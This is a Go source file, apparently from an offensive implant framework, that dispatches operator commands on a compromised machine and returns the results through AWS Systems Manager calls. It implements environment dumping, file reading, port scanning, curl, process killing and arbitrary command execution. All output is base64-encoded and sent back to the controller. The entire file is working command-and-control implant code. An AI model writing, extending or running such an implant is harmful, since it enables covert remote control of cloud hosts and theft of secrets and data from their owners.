package implantrun

import (
	"bytes"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/grines/ssmmm/awsrsa"
	"github.com/grines/ssmmm/awsssm"
	"github.com/grines/ssmmm/implant/cat"
	"github.com/grines/ssmmm/implant/implantchmod"
	"github.com/grines/ssmmm/implant/implantcp"
	"github.com/grines/ssmmm/implant/implantcurl"
	"github.com/grines/ssmmm/implant/implantenv"
	"github.com/grines/ssmmm/implant/implantexec"
	"github.com/grines/ssmmm/implant/implantkill"
	"github.com/grines/ssmmm/implant/implantls"
	"github.com/grines/ssmmm/implant/implantmkdir"
	"github.com/grines/ssmmm/implant/implantmv"
	"github.com/grines/ssmmm/implant/implantps"
	"github.com/grines/ssmmm/implant/implantutil"
	"github.com/grines/ssmmm/implant/portscan"
	"github.com/grines/ssmmm/implant/pwd"
	"github.com/grines/ssmmm/implant/wd"
	"github.com/grines/ssmmm/implant/whoami"
)

func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managedInstanceID string, instanceRegion string) error {
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	if len(arrCommandStr) < 1 {
		return errors.New("")
	}
	switch arrCommandStr[0] {
	case "ps":
		procs := implantps.Ps()
		validateCommand(cmdid, tokens, managedInstanceID, strings.Join(procs[:], "\n"), instanceRegion)
	case "env":
		data := implantenv.Env()
		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
	case "whoami":
		user, _ := whoami.Whoami()
		validateCommand(cmdid, tokens, managedInstanceID, user.Username, instanceRegion)
	case "pwd":
		data, _ := pwd.Pwd()
		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
	case "portscan":
		data := portscan.Portscan()
		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
	case "ls":
		var path string
		if len(arrCommandStr) == 1 {
			path = "./"
		} else {
			path = arrCommandStr[1]
		}
		list := implantls.Ls(path)
		data := strings.Join(list, "\n")
		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
	case "cat":
		data := cat.Cat(arrCommandStr[1])
		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
	case "cp":
		data, err := implantcp.Copy(arrCommandStr[1], arrCommandStr[2])
		if err == nil {
			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
		}
	case "mv":
		var args implantmv.Arguments
		args.SourceFile = arrCommandStr[1]
		args.DestinationFile = arrCommandStr[2]
		data := implantmv.Mv(args)
		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
	case "curl":
		data := implantcurl.Curl(arrCommandStr[1])
		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
	case "chmod":
		intVar, _ := strconv.Atoi(arrCommandStr[2])
		implantchmod.Chmod(arrCommandStr[1], intVar)
		validateCommand(cmdid, tokens, managedInstanceID, "", instanceRegion)
	case "exec":
		var args []string
		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
		args = arrCommandStr[2:]
		data := implantexec.Exec(arrCommandStr[1], args)
		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
	case "cd":
		if len(arrCommandStr) > 1 {
			os.Chdir(arrCommandStr[1])
			validateCommand(cmdid, tokens, managedInstanceID, wd.WorkingDir(), instanceRegion)
			awsssm.UpdateInstanceInformation(tokens, managedInstanceID, instanceRegion)
		}
		return nil
	case "killimplant":
		os.Exit(0)
	case "kill":
		data := implantkill.Kill(arrCommandStr[1])
		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
	case "mkdir":
		data := implantmkdir.Mkdir(arrCommandStr[1])
		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
	default:
		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		err := cmd.Run()
		if err != nil {
			erout := fmt.Sprint(err) + ": " + stderr.String()
			validateCommand(cmdid, tokens, managedInstanceID, erout, instanceRegion)
			return nil
		}
		validateCommand(cmdid, tokens, managedInstanceID, out.String(), instanceRegion)
		return nil
	}
	return nil
}

func validateCommand(cmdid string, tokens awsrsa.AwsToken, managedInstanceID string, data string, instanceRegion string) {
	awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
	awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
}
